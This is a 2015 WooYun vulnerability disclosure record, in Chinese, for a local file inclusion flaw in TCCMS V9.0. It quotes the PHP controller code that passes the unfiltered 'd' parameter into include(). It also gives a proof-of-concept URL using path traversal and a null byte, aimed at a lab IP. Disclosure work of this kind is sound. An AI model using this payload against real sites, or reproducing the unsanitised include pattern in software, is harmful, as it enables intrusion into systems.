{"id": 35382, "wybug_id": "wooyun-2015-0104065", "wybug_title": "TCCMSV9.0 最新版本地文件包含", "wybug_corp": "teamcen.com", "wybug_author": "路人甲", "wybug_date": "2015-03-27 15:39", "wybug_open_date": "2015-06-30 15:41", "wybug_type": "文件包含", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-01：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-30：\t细节向公众公开  简要描述： RT 详细说明：  \npublic function Run() {        $this->Analysis();        $this->control = $_GET['c'];        $this->action = $_GET['a'];        if ($_GET['a'] === \"list\") {            $this->action = \"listAll\";        }        //子目录支持        $dir = '';        if (isset($_GET['d'])) {        \t$dir .= $_GET['d'].'/';        }    \t$adminDir = '/controller/';        if (defined('IN_ADMIN')) {        \t$adminDir = '/admin/';        }        //子模块支持        $module = strcmp(MODULE, \"/\") == 0 ? 'app' : MODULE;        $controlFile = ROOT_PATH . '/' . $module . $adminDir . $dir . $this->control . '.class.php';        if (!file_exists($controlFile)) {            $this->setValue(\"error\", $this->control . Config::lang(\"CONTROLLERNOTEXISTS\"));            $this->forward(\"error.html\");            exit;        }        include($controlFile);        if (!class_exists($this->control)) {            $this->setValue(\"error\", $this->control . Config::lang(\"CONTROLLERNOTDEFINED\"));            $this->forward(\"error.html\");            exit;        }        $instance = new $this->control();        if (!method_exists($instance, $this->action)) {            $this->setValue(\"error\", $this->action . Config::lang(\"METHODNOTFIND\"));            $this->forward(\"error.html\");            exit;        }        $methodName = $this->action;        $instance->$methodName();    }\n在这段代码中，$controlFile = ROOT_PATH . '/' . $module . $adminDir . $dir . $this->control . '.class.php';其中发现$dir .= $_GET['d'].'/' ，而$dir并没有做任何参数过滤。最终程序执行include($controlFile)导致本地文件包含在网站根目录下添加一个测试的txt文件:POC:http://192.168.152.160/tccms/index.php?d=../../1.txt%00\n\n   漏洞证明：  在网站根目录下添加一个测试的txt文件:POC:http://192.168.152.160/tccms/index.php?d=../../1.txt%00\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-06-30 15:41 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}